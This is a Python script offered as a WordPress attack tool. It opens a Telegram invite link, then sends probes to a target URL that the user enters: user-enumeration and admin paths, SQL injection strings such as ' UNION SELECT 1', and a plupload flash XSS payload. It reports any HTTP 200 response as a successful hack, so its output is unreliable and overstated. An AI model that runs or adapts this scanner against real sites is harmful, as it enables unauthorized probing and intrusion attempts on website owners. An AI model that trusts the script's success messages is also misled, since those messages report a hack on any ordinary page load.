import requests
import datetime
import time
import colorama
from colorama import Fore,Back,Style, init
import webbrowser
from bs4 import BeautifulSoup
import subprocess
import sys

papa = [
    'requests',
    'colorama',
    'bs4',
]

def install(package):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

def papap(papa):
    for package in papa:
        try:
            __import__(package)
            print(f'Libary "{package}" download.')
        except ImportError:
            print(f'Libary "{package}" Not found!')
            install(package)
papap(papa)
init(autoreset=True)

now = datetime.datetime.now()
print(Fore.GREEN + "[!] Example: https://www.nasa.gov/")
webbrowser.open("https://t.me/+I7zqLpDzO0VkOTUy")
print("JOIN US IN TG")
print("GovnoPress By @CyberRebik")
url = input("URL: ")
if ".ru" in url:
	print("NO!🥸")
	exit()
payload = 'wp-json/wp/v2/users/'
payload1 = 'wp-register.php/'
payload2 = 'admin.php/'
payload3 = 'wp-admin/'
payload4 = 'wp-includes/'
payload5 = "'"
payload6 = 'robots.txt'
payload7 = 'wp-includes/js/plupload/plupload.flash.swf?id='
payload8 = 'wp-includes/js/plupload/plupload.flash.swf?id=\”));}catch(c){alert(1);}//'
payload9 = ' UNION SELECT 1'
titi = now.strftime("%H:%M:%S")
response = requests.get(url + payload)
print(f"{Fore.YELLOW}Trying {payload} . . .")
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes hacked WordPress with payload {payload}!")
	webbrowser.open(url + payload)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload}")
	
print(f"{Fore.YELLOW}Trying {payload1} . . .")
response = requests.get(url + payload1)
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes hacked WordPress with payload {payload1}!")
	print(url + payload1)
	webbrowser.open(url + payload1)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload1}")

print(f"{Fore.YELLOW}Trying {payload2} . . .")
response = requests.get(url + payload2)
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes hacked WordPress with payload {payload2}!")
	print(url + payload2)
	webbrowser.open(url + payload2)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload2}")

print(f"{Fore.YELLOW}Trying {payload3} . . .")
response = requests.get(url + payload3)
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes hacked WordPress with payload {payload3}!")
	print(url + payload3)
	webbrowser.open(url + payload3)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload3}")

print(f"{Fore.YELLOW}Trying {payload4} . . .")
response = requests.get(url + payload4)
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes hacked WordPress with payload {payload4}!")
	print(url + payload4)
	webbrowser.open(url + payload4)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload4}")
	
print(f"{Fore.YELLOW}Trying {payload5} . . .")
response = requests.get(url + payload5)
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes SQL vuln with payload {payload5}!\nTry inject . . .")
	print(url + payload5)
	response = requests.get(url + payload9)
	if response.status_code == 200:
		print(f"{Fore.GREEN}[{titi}] Injected! {payload9}")
		print(url + payload9)
		webbrowser.open(url + payload9)
	else:
		print(":(")
	webbrowser.open(url + payload5)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload5}")
	
print(f"{Fore.YELLOW}Trying {payload6} . . .")
response = requests.get(url + payload6)
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes founded robots.txt with payload {payload6}!")
	print(url + payload6)
	webbrowser.open(url + payload6)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload6}")
	
print(f"{Fore.YELLOW}Trying {payload4} . . .")
response = requests.get(url + payload7)
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes hacked WordPress with payload {payload7}!")
	print(url + payload7)
	webbrowser.open(url + payload7)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload7}")
	
print(f"{Fore.YELLOW}Trying {payload4} . . .")
response = requests.get(url + payload8)
if response.status_code == 200:
	print(f"{Fore.GREEN}[{titi}] Succes hacked WordPress with payload {payload8}!")
	print(url + payload8)
	webbrowser.open(url + payload8)
else:
	print(f"{Fore.RED}[{titi}] Fail :( {payload8}") 
